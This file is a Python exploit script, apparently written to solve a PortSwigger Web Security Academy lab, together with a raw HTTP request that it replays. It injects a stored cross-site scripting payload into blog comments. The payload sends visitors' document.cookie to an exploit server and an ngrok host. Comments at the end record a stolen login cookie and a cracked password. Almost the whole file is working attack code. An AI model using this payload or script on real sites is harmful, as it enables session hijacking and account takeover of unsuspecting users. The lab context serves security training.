''''POST /post/comment HTTP/2
Host: 0a1e00a70363397b80677bff00500055.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 265
Origin: https://0a1e00a70363397b80677bff00500055.web-security-academy.net
Connection: keep-alive
Referer: https://0a1e00a70363397b80677bff00500055.web-security-academy.net/post?postId=5
Cookie: session=flGLYrsaGMfLG9G5AGIYIAtbeYr6GrIO; stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
TE: trailers

postId=5&comment=%3Cimg+src%3Dx+onerror%3D%22this.src%3D%27https%3A%2F%2F09b2-2-132-32-77.ngrok-free.app%2F%3F%27%2Bdocument.cookie%3B+this.removeAttribute%28%27onerror%27%29%3B%22%3E&name=afsdf&email=sadf%40sdf&website=https%3A%2F%2F09b2-2-132-32-77.ngrok-free.app
'''

import requests

DOMAIN = "0a1300d40487aa1882dd1a6600a7005b.web-security-academy.net"
EXPLOIT_SERVER = "https://exploit-0add0009048aaadc82941902013e0056.exploit-server.net/exploit"

HEADERS = {
    "Host": DOMAIN,
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"https://{DOMAIN}",
    "Connection": "keep-alive",
    "Referer": f"https://{DOMAIN}/post?postId=5",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "TE": "trailers"
}

COOKIES = {
    "session": "flGLYrsaGMfLG9G5AGIYIAtbeYr6GrIO",
    "stay-logged-in": "d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw"
}

def send_comments():
    payload = f"<img src=x onerror=\"this.src='{EXPLOIT_SERVER}/?'+document.cookie; this.removeAttribute('onerror');\">"

    url = f"https://{DOMAIN}/post/comment"
    data = {
        "postId": "5",
        "comment": payload,
        "name": "afsdf",
        "email": "sadf@sdf",
        "website": f"https://09b2-2-132-32-77.ngrok-free.app"
    }

    for i in range(1, 10):
        data["postId"] = str(i)
        response = requests.post(url, headers=HEADERS, cookies=COOKIES, data=data)
    

# send_comments() # /exploit/?secret=OtlZCG2rN8lRoT10QVEyNr9M75OVCbyn;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz  #carlos:26323c16d5f4dabff3bb136f2460a943
# carlos:onceuponatime
